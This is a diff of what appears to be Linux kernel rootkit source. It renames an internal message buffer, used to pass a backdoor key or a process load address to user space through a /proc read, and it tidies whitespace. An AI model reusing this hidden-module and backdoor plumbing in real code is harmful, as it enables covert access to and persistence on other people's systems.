@@ -59,7 +59,7 @@ struct __lkmmod_t {
 	struct module *this_mod;
 };
 static DEFINE_MUTEX(prc_mtx);
-static DEFINE_SPINLOCK(elfbits_spin);
+static DEFINE_SPINLOCK(msguser_spin);
 static struct kv_crypto_st *kvmgc_unhidekey;
 
 // Makefile auto-generated - DO NOT EDIT
@@ -330,35 +330,35 @@ out_put_kobj:
 	mod_list = NULL;
 }
 
-struct elfbits_t {
-	char bits[PAGE_SIZE];
+struct msguser_t {
+	char bytes[PAGE_SIZE];
 	bool ready;
 };
-static struct elfbits_t ElfBits;
+static struct msguser_t MsgUser;
 
-void kv_set_elfbits(char *bits)
+void kv_set_msguser(char *bytes)
 {
-	if (bits) {
-		spin_lock(&elfbits_spin);
-		memset(&ElfBits, 0, sizeof(struct elfbits_t));
-		snprintf(ElfBits.bits, PAGE_SIZE-1, "%s", bits);
-		ElfBits.ready = true;
-		spin_unlock(&elfbits_spin);
+	if (bytes) {
+		spin_lock(&msguser_spin);
+		memset(&MsgUser, 0, sizeof(struct msguser_t));
+		snprintf(MsgUser.bytes, PAGE_SIZE - 1, "%s", bytes);
+		MsgUser.ready = true;
+		spin_unlock(&msguser_spin);
 	}
 }
 
 /** XXX: fix/improve this API */
-static struct elfbits_t *get_elfbits(bool *ready)
+static struct msguser_t *get_msguser(bool *ready)
 {
-	spin_lock(&elfbits_spin);
-	if (ElfBits.ready) {
+	spin_lock(&msguser_spin);
+	if (MsgUser.ready) {
 		if (ready)
-			*ready = ElfBits.ready;
-		ElfBits.ready = false;
-		spin_unlock(&elfbits_spin);
-		return &ElfBits;
+			*ready = MsgUser.ready;
+		MsgUser.ready = false;
+		spin_unlock(&msguser_spin);
+		return &MsgUser;
 	}
-	spin_unlock(&elfbits_spin);
+	spin_unlock(&msguser_spin);
 	return NULL;
 }
 
@@ -378,14 +378,14 @@ static ssize_t _seq_read(struct file *fptr, char __user *buffer, size_t count,
 {
 	ssize_t rv = 0;
 	bool ready = false;
-	struct elfbits_t *elfbits;
+	struct msguser_t *umsg;
 	char *kbuf = NULL;
 
 	if (*ppos > 0 || !count)
 		return 0;
 
-	elfbits = get_elfbits(&ready);
-	if (!elfbits || !ready) {
+	umsg = get_msguser(&ready);
+	if (!umsg || !ready) {
 		rv = -ENOENT;
 		goto leave;
 	}
@@ -396,7 +396,7 @@ static ssize_t _seq_read(struct file *fptr, char __user *buffer, size_t count,
 		goto leave;
 	}
 
-	rv = snprintf(kbuf, PAGE_SIZE-1, "%s\n", elfbits->bits);
+	rv = snprintf(kbuf, PAGE_SIZE - 1, "%s\n", umsg->bytes);
 	if (copy_to_user(buffer, kbuf, rv)) {
 		rv = -EFAULT;
 		goto cleanup;
@@ -527,7 +527,7 @@ void _crypto_cb(const u8 *const buf, size_t buflen, size_t copied,
 		 validate->op == Opt_get_bdkey) {
 		char bits[32 + 1] = { 0 };
 		snprintf(bits, 32, "%llx", *((uint64_t *)buf));
-		kv_set_elfbits(bits);
+		kv_set_msguser(bits);
 	}
 #endif
 }
@@ -666,7 +666,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 				char bits[32 + 1] = { 0 };
 				base = kv_get_elf_vm_start(pid);
 				snprintf(bits, 32, "%lx", base);
-				kv_set_elfbits(bits);
+				kv_set_msguser(bits);
 			}
 		} break;
 		case Opt_signal_task_stop:
@@ -834,9 +834,9 @@ static int _proc_watchdog(void *unused)
 		ssleep(1);
 	}
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
-			kaddr->k_do_exit(0);
+	kaddr->k_do_exit(0);
 #else
-			do_exit(0);
+	do_exit(0);
 #endif
 }
 
@@ -937,9 +937,9 @@ static int __init kv_init(void)
 	if (!tsk_prc)
 		goto background_error;
 
-
 	/** short lived task */
-	tsk_tainted = kthread_run(_post_initmod, kv_kall_load_addr(), THREAD_POST_LOADING);
+	tsk_tainted = kthread_run(_post_initmod, kv_kall_load_addr(),
+				  THREAD_POST_LOADING);
 	if (!tsk_tainted)
 		goto background_error;
 
